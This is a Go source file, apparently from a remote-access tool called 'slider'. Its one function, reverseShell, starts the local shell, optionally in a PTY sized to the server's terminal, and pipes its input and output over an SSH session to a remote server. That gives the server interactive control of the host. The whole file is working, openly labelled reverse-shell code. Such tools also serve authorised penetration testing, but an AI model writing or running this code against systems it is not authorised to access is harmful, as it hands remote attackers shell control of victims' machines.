//go:build !windows

package client

import (
	"encoding/json"
	"fmt"
	"io"
	"os/exec"
	"slider/pkg/interpreter"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
	stdin, stdinErr := sshSession.StdinPipe()
	if stdinErr != nil {
		c.Printf("session.StdinPipe: %s", stdinErr)
	}
	defer func() {
		_ = stdin.Close()
	}()
	stdout, stdoutErr := sshSession.StdoutPipe()
	if stdoutErr != nil {
		c.Printf("session.StdoutPipe: %s", stdoutErr)
	}

	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec

	// Request Server Term Size
	_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
	if reqErr != nil {
		return reqErr
	}
	var termSize interpreter.TermSize
	if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
		// If error term initializes with size 0 0
		c.Errorf("%s", unMarshalErr)
	}

	if c.interpreter.PtyOn {
		// Notify server we will be sending a PTY
		errSSHReq := c.sendSessionRequest(sshSession, "pty-req", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("pty-req %s", errSSHReq)
		}

		// Notify server we will send a Reverse Shell
		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("reverse-shell %s", errSSHReq)
		}

		c.ptyFile, _ = pty.StartWithSize(cmd, &pty.Winsize{
			Rows: uint16(termSize.Rows),
			Cols: uint16(termSize.Cols),
		})

		// Copy all SSH session output to the term
		go func() {
			if _, outCopyErr := io.Copy(c.ptyFile, stdout); outCopyErr != nil {
				c.Debugf("Copy stdout: %s", outCopyErr)
			}
		}()

		// Answer Server we are good to go
		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		// Copy term output to SSH session stdin
		if _, inCopyErr := io.Copy(stdin, c.ptyFile); inCopyErr != nil {
			c.Debugf("Copy stdin: %s", inCopyErr)
		}
	} else {
		// Notify server we will send a Reverse Shell
		errSSHReq := c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("reverse-shell %s", errSSHReq)
		}
		// Pipe requirement on Windows
		rp, wp := io.Pipe()
		go func() {
			_, _ = io.Copy(wp, stdout)
			c.Debugf("out finish")
		}()

		cmd.Stdout = stdin
		cmd.Stdin = rp
		cmd.Stderr = stdin

		environment := []string{
			fmt.Sprintf("LINES=%d", termSize.Rows),
			fmt.Sprintf("COLUMNS=%d", termSize.Cols),
		}
		for _, envVar := range environment {
			cmd.Env = append(cmd.Environ(), envVar)
		}

		// Answer Server we are good to go
		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		if runErr := cmd.Run(); runErr != nil {
			return runErr
		}
	}

	return nil
}
